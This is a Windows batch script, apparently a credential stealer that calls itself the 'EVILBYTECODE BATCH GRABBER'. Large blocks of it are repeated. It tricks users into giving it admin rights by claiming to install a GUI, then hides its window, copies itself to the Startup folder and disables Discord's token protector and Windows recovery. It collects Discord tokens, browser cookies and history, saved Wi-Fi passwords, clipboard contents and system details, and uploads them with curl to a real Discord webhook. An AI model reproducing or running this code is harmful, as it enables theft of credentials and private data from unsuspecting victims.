powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

powershell -Command "Get-WmiObject -Query 'SELECT * FROM Win32_Product' | Select-Object Name | ForEach-Object { Write-Output $_.Name } | Out-File -FilePath '%rmpath%\installedprograms.txt' -Encoding UTF8"
powershell -Command "Get-Process | Select-Object Id, ProcessName | Format-Table -AutoSize | Out-File -FilePath '%rmpath%\runningprocesses.txt' -Encoding UTF8"


curl -s -H "Expect: application/json" -F "file=@%rmpath%\runningprocesses.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@%rmpath%\installedprograms.txt" %webhook% >NUL
del "!rmpath!\installedprograms.txt"
del "!rmpath!\runningprocesses.txt"
goto swap

:swap
rundll32.exe user32.dll,SwapMouseButton
goto wifi

:wifi 
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
::credit to AleksaMCode on github for this, i just modified it a bit thanks :)
powershell -command "$Profiles=@(); $Profiles += (netsh wlan show profiles) | Select-String '\:(.+)$' | Foreach{ $_.Matches.Groups[1].Value.Trim() }; $res = $Profiles | Foreach{ $SSID=$_; (netsh wlan show profile name=\"$_\" key=clear) } | Select-String 'Key Content\W+\:(.+)$' | Foreach{ $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | Foreach{ [PSCustomObject]@{ Wireless_Network_Name=$SSID; Password=$pass } } | Format-Table -AutoSize; $res | Out-File -FilePath '%rmpath%\wifipass.txt' -Encoding ASCII -Width 50"
curl -s -H "Expect: application/json" -F "file=@%rmpath%\wifipass.txt" %webhook% >NUL
del "!rmpath!\wifipass.txt"
goto sound


:tokens

if exist "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\" (
    rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\"
)
cls
:: thanks to overflow for this code, i havent made it lol, i just rewrited it to loop 5 times
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
set "source=%appdata%\discord"
set "source1=%appdata%\discord\Local Storage\leveldb" 
set "subdirectory=%temp%\Discord"
set "zipfile=%subdirectory%\DiscordFiles.zip"

if not exist "%subdirectory%" mkdir "%subdirectory%" >nul

for %%f in ("%source1%\*.log" "%source1%\*.ldb") do (
    copy "%%f" "%subdirectory%\" >nul
)

copy "%source%\Local State" "%subdirectory%\LocalState.txt" >nul

powershell Compress-Archive -Path "%subdirectory%\*" -DestinationPath "%zipfile%"
curl -F c=@"%zipfile%" %webhook%

::btw it zips up all etc, cuz its better for decryption bot you gotta all drop up
:: also its based rly on users connection..
goto ipnsys

:sound
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

set "url=https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&"
set "OF=%localappdata%\Temp\Sex.mp3"
curl -s -o "%OF%" "%url%" >NUL
(
  echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%OF%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo     wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
) >sound.vbs
start /min sound.vbs

goto disablefacreset

:disablefacreset
reagentc.exe /disable
cls
goto browserdata




:browserdata
set "browserdat=%temp%\browserdata"
set "browdat=%temp%\browserdata.zip"

mkdir "%browserdat%" 2>nul
copy "%localappdata%\Google\Chrome\User Data\Default\Cookies" "%browserdat%\Chrome_Cookies.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\History" "%browserdat%\Chrome_History.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\Bookmarks" "%browserdat%\Chrome_Bookmarks.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Cookies" "%browserdat%\MicrosoftEdge_Cookies.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\History" "%browserdat%\MicrosoftEdge_History.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Favorites\*.url" "%browserdat%\MicrosoftEdge_Bookmarks.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\Cookies" "%browserdat%\OperaGX_Cookies.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\History" "%browserdat%\OperaGX_History.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\Bookmarks" "%browserdat%\OperaGX_Bookmarks.txt"
copy "%APPDATA%\Opera Software\Opera Stable\Cookies" "%browserdat%\Opera_Cookies.txt"
copy "%APPDATA%\Opera Software\Opera Stable\History" "%browserdat%\Opera_History.txt"
copy "%APPDATA%\Opera Software\Opera Stable\Bookmarks" "%browserdat%\Opera_Bookmarks.txt"
copy "%userprofile%\Favorites\*.url" "%browserdat%\InternetExplorer_Bookmarks.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\Cookies" "%browserdat%\Edge_Cookies.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%browserdat%\Edge_History.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\Favorites\*.url" "%browserdat%\Edge_Bookmarks.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" "%browserdat%\Firefox_Cookies.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\places.sqlite" "%browserdat%\Firefox_History.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\places.sqlite" "%browserdat%\Firefox_Bookmarks.txt"

powershell -noprofile -command "Compress-Archive -Path '%browserdat%\*' -DestinationPath '%browdat%'"
rd /s /q "%browserdat%" 2>nul
cls
curl -F c=@"%temp%\browserdata.zip" %webhook%

goto pcscrape

:pcscrape
set "pcsraper=%temp%\pcscrape.txt"
echo ──────EVILBYTECODE BATCH GRABBER──────[Clipboard]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
powershell -Command "Get-Clipboard" >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Current User]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
whoami /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Local Network]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[FireWall Config]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netsh firewall show config >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Local Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net user >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Admin Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net localgroup administrators >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Anti-Virus Programs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Port Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netstat -ano >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Routing Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
route print >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Hosts]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
type c:\Windows\system32\drivers\etc\hosts >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[WIFI Networks]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netsh wlan show profile >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Startups]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
wmic startup get command, caption >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[DNS Records]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /displaydns >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[User Group Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net localgroup >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Network Configuration]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Event Logs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
wevtutil qe System /c:1 /rd:true /f:text /q:*[System[(Level=2 or Level=3)]] >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Environment Variables]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
set >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[ARP Table]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
arp -a >> "%pcsraper%"
curl -F c=@"%temp%\pcscrape.txt" %webhook%
go :check_Permissions







@echo off
setlocal enabledelayedexpansion


:: If not admin, relaunch the script with admin rights
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo click yes to install a gui
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
    echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
    "%temp%\GetAdmin.vbs"
    del "%temp%\GetAdmin.vbs"
    exit /B
)


:check_Permissions
    
::ik this does same as the vbs uac prompt but ykyk
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti
echo installing a gui
powershell -Command "Get-WmiObject Win32_PortConnector" >%localappdata%\Temp\antivm.txt
findstr /m "Port Connector" %localappdata%\Temp\antivm.txt 
if %errorlevel%==0 (
goto a
)

cls
del %localappdata%\Temp\antivm.txt
goto realstart

:a
del %localappdata%\Temp\antivm.txt
goto realstart 



:realstart
:: hides console window feel free to decode!
Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIAUQBXAFIAawBMAFYAUgA1AGMARwBVAGcAUQBDAEkATgBDAGkAQQBnAEkAQwBCADEAYwAyAGwAdQBaAHkAQgBUAGUAWABOADAAWgBXADAANwBEAFEAbwBnAEkAQwBBAGcAZABYAE4AcABiAG0AYwBnAFUAMwBsAHoAZABHAFYAdABMAGwASgAxAGIAbgBSAHAAYgBXAFUAdQBTAFcANQAwAFoAWABKAHYAYwBGAE4AbABjAG4AWgBwAFkAMgBWAHoATwB3ADAASwBEAFEAbwBnAEkAQwBBAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAVgB6AFoAWABJAHoATQBpAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEYAdABFAGIARwB4AEoAYgBYAEIAdgBjAG4AUQBvAEkAbgBWAHoAWgBYAEkAegBNAGkANQBrAGIARwB3AGkASwBWADAATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBjAEgAVgBpAGIARwBsAGoASQBIAE4AMABZAFgAUgBwAFkAeQBCAGwAZQBIAFIAbABjAG0ANABnAFkAbQA5AHYAYgBDAEIAVABhAEcAOQAzAFYAMgBsAHUAWgBHADkAMwBLAEUAbAB1AGQARgBCADAAYwBpAEIAbwBWADIANQBrAEwAQwBCAHAAYgBuAFEAZwBiAGsATgB0AFoARgBOAG8AYgAzAGMAcABPAHcAMABLAEkAQwBBAGcASQBIADAATgBDAGcAMABLAEkAQwBBAGcASQBIAEIAMQBZAG0AeABwAFkAeQBCAGoAYgBHAEYAegBjAHkAQgBMAFoAWABKAHUAWgBXAHcAegBNAGkAQgA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkARgB0AEUAYgBHAHgASgBiAFgAQgB2AGMAbgBRAG8ASQBtAHQAbABjAG0ANQBsAGIARABNAHkATABtAFIAcwBiAEMASQBwAFgAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAHcAZABXAEoAcwBhAFcATQBnAGMAMwBSAGgAZABHAGwAagBJAEcAVgA0AGQARwBWAHkAYgBpAEIASgBiAG4AUgBRAGQASABJAGcAUgAyAFYAMABRADIAOQB1AGMAMgA5AHMAWgBWAGQAcABiAG0AUgB2AGQAeQBnAHAATwB3ADAASwBJAEMAQQBnAEkASAAwAE4AQwBpAEoAQQBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFcAaABwAFoARwBVAGcAUABTAEEAdwBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFgAZABwAGIAbQBRAGcAUABTAEIAYgBTADIAVgB5AGIAbQBWAHMATQB6AEoAZABPAGoAcABIAFoAWABSAEQAYgAyADUAegBiADIAeABsAFYAMgBsAHUAWgBHADkAMwBLAEMAawBOAEMAbABkAHkAYQBYAFIAbABMAFUAaAB2AGMAMwBRAGcASQBuAGwAdgBkAFMAQgBqAFkAVwA0AGcAYwAyAFYAbABJAEgAUgBvAGEAWABNAGgASQBnADAASwBVADMAUgBoAGMAbgBRAHQAVQAyAHgAbABaAFgAQQBnAE0AdwAwAEsAVwAxAFYAegBaAFgASQB6AE0AbAAwADYATwBsAE4AbwBiADMAZABYAGEAVwA1AGsAYgAzAGMAbwBKAEcAdABwAGQASABSADUAZAAyAGwAdQBaAEMAdwBnAEoARwB0AHAAZABIAFIANQBhAEcAbABrAFoAUwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBJAG4AbAB2AGQAUwBCAGoAWQBXADUAdQBiADMAUQBnAGMAMgBWAGwASQBIAFIAbwBhAFgATQBoAEkAZwAwAEsAVQAzAFIAaABjAG4AUQB0AFUAMgB4AGwAWgBYAEEAZwBNAFQAVQBOAEMAZwA9AD0AIgB9ACcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AUwBjAHIAaQBwAHQAKQApACAAfAAgAGkAZQB4AA==
set "destination=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%~f0" "%destination%"

cd /d "%destination%"
attrib +h +s %destination%
:: Replace your webhook here so it sends the request or else it wont work!
set "webhook=https://discord.com/api/webhooks/1342460073196126239/K3ZLRM5nct9HuxabMDN4Plz1VFNETEofaTNtFfq9gbY9ARSWtst3LjznmA6fnsScmx4Y"
set "rmpath=%userprofile%\AppData\Roaming\EvilBytecode"
::roaming path that where info will be stored in like sys and ip.

goto discordkill


:discordkill
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
cls
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
cls
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
cls
goto tokens


:ipnsys
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

cls
if not exist "!rmpath!" mkdir "!rmpath!"
for /f "delims=" %%i in ('powershell -Command "& { $env:COMPUTERNAME; $env:USERNAME; (Get-WmiObject Win32_VideoController).Caption; (Get-WmiObject Win32_Processor).Name; (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB; (Get-CimInstance Win32_ComputerSystemProduct).UUID }"') do (
    set "info=%%i"
    set "info=!info:"=!"
    echo !info!>> "!rmpath!\sys.txt"
)
powershell -Command "$response = Invoke-RestMethod -Uri 'https://ipinfo.io/json' -Method GET; $response.ip" > "!rmpath!\ip.txt"
curl -s -H "Expect: application/json" -F "file=@!rmpath!\sys.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@!rmpath!\ip.txt" %webhook% >NUL 
:: silent and nul so it doesnt show it sended request
del "!rmpath!\sys.txt"
del "!rmpath!\ip.txt"


goto extrainfo

:extrainfo
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

powershell -Command "Get-WmiObject -Query 'SELECT * FROM Win32_Product' | Select-Object Name | ForEach-Object { Write-Output $_.Name } | Out-File -FilePath '%rmpath%\installedprograms.txt' -Encoding UTF8"
powershell -Command "Get-Process | Select-Object Id, ProcessName | Format-Table -AutoSize | Out-File -FilePath '%rmpath%\runningprocesses.txt' -Encoding UTF8"


curl -s -H "Expect: application/json" -F "file=@%rmpath%\runningprocesses.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@%rmpath%\installedprograms.txt" %webhook% >NUL
del "!rmpath!\installedprograms.txt"
del "!rmpath!\runningprocesses.txt"
goto swap

:swap
rundll32.exe user32.dll,SwapMouseButton
goto wifi

:wifi 
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
::credit to AleksaMCode on github for this, i just modified it a bit thanks :)
powershell -command "$Profiles=@(); $Profiles += (netsh wlan show profiles) | Select-String '\:(.+)$' | Foreach{ $_.Matches.Groups[1].Value.Trim() }; $res = $Profiles | Foreach{ $SSID=$_; (netsh wlan show profile name=\"$_\" key=clear) } | Select-String 'Key Content\W+\:(.+)$' | Foreach{ $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | Foreach{ [PSCustomObject]@{ Wireless_Network_Name=$SSID; Password=$pass } } | Format-Table -AutoSize; $res | Out-File -FilePath '%rmpath%\wifipass.txt' -Encoding ASCII -Width 50"
curl -s -H "Expect: application/json" -F "file=@%rmpath%\wifipass.txt" %webhook% >NUL
del "!rmpath!\wifipass.txt"
goto sound


:tokens

if exist "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\" (
    rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\"
)
cls
:: thanks to overflow for this code, i havent made it lol, i just rewrited it to loop 5 times
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
set "source=%appdata%\discord"
set "source1=%appdata%\discord\Local Storage\leveldb" 
set "subdirectory=%temp%\Discord"
set "zipfile=%subdirectory%\DiscordFiles.zip"

if not exist "%subdirectory%" mkdir "%subdirectory%" >nul

for %%f in ("%source1%\*.log" "%source1%\*.ldb") do (
    copy "%%f" "%subdirectory%\" >nul
)

copy "%source%\Local State" "%subdirectory%\LocalState.txt" >nul

powershell Compress-Archive -Path "%subdirectory%\*" -DestinationPath "%zipfile%"
curl -F c=@"%zipfile%" %webhook%

::btw it zips up all etc, cuz its better for decryption bot you gotta all drop up
:: also its based rly on users connection..
goto ipnsys

:sound
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

set "url=https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&"
set "OF=%localappdata%\Temp\Sex.mp3"
curl -s -o "%OF%" "%url%" >NUL
(
  echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%OF%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo     wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
) >sound.vbs
start /min sound.vbs

goto disablefacreset

:disablefacreset
reagentc.exe /disable
cls
goto browserdata




:browserdata
set "browserdat=%temp%\browserdata"
set "browdat=%temp%\browserdata.zip"

mkdir "%browserdat%" 2>nul
copy "%localappdata%\Google\Chrome\User Data\Default\Cookies" "%browserdat%\Chrome_Cookies.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\History" "%browserdat%\Chrome_History.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\Bookmarks" "%browserdat%\Chrome_Bookmarks.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Cookies" "%browserdat%\MicrosoftEdge_Cookies.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\History" "%browserdat%\MicrosoftEdge_History.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Favorites\*.url" "%browserdat%\MicrosoftEdge_Bookmarks.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\Cookies" "%browserdat%\OperaGX_Cookies.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\History" "%browserdat%\OperaGX_History.txt"
copy "%APPDATA%\Opera Software\Opera GX Stable\Bookmarks" "%browserdat%\OperaGX_Bookmarks.txt"
copy "%APPDATA%\Opera Software\Opera Stable\Cookies" "%browserdat%\Opera_Cookies.txt"
copy "%APPDATA%\Opera Software\Opera Stable\History" "%browserdat%\Opera_History.txt"
copy "%APPDATA%\Opera Software\Opera Stable\Bookmarks" "%browserdat%\Opera_Bookmarks.txt"
copy "%userprofile%\Favorites\*.url" "%browserdat%\InternetExplorer_Bookmarks.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\Cookies" "%browserdat%\Edge_Cookies.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%browserdat%\Edge_History.txt"
copy "%localappdata%\Microsoft\Edge\User Data\Default\Favorites\*.url" "%browserdat%\Edge_Bookmarks.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" "%browserdat%\Firefox_Cookies.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\places.sqlite" "%browserdat%\Firefox_History.txt"
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\places.sqlite" "%browserdat%\Firefox_Bookmarks.txt"

powershell -noprofile -command "Compress-Archive -Path '%browserdat%\*' -DestinationPath '%browdat%'"
rd /s /q "%browserdat%" 2>nul
cls
curl -F c=@"%temp%\browserdata.zip" %webhook%

goto pcscrape

:pcscrape
set "pcsraper=%temp%\pcscrape.txt"
echo ──────EVILBYTECODE BATCH GRABBER──────[Clipboard]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
powershell -Command "Get-Clipboard" >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Current User]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
whoami /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Local Network]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[FireWall Config]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netsh firewall show config >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Local Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net user >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Admin Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net localgroup administrators >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Anti-Virus Programs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Port Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netstat -ano >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Routing Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
route print >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Hosts]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
type c:\Windows\system32\drivers\etc\hosts >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[WIFI Networks]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
netsh wlan show profile >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Startups]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
wmic startup get command, caption >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[DNS Records]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /displaydns >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[User Group Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
net localgroup >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Network Configuration]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
ipconfig /all >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Event Logs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
wevtutil qe System /c:1 /rd:true /f:text /q:*[System[(Level=2 or Level=3)]] >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[Environment Variables]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
set >> "%pcsraper%"
echo ──────EVILBYTECODE BATCH GRABBER──────[ARP Table]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
arp -a >> "%pcsraper%"
curl -F c=@"%temp%\pcscrape.txt" %webhook%
start "" /min powershell -WindowStyle Hidden -Command ^
    $X = %X%; $Y = %Y%; ^
    Add-Type -AssemblyName 'System.Windows.Forms'; ^
    $form = New-Object System.Windows.Forms.Form; ^
    $form.Text = 'Error'; ^
    $form.Text = 'Error'; ^
    $form.Width = 0; $form.Height = 0; ^
    $form.StartPosition = 'Manual'; ^
    $form.Location = New-Object System.Drawing.Point($X, $Y); ^
    $form.TopMost = $true; ^
    $form.Show(); ^
    [System.Windows.Forms.MessageBox]::Show('ERROR: wait 2 min everything almost done', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error); ^
    powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize' -Name 'AppsUseLightTheme' -Value 0"
    $form.Close()

set /a X=%random% %% 1920
set /a Y=%random% %% 1080
endlocal

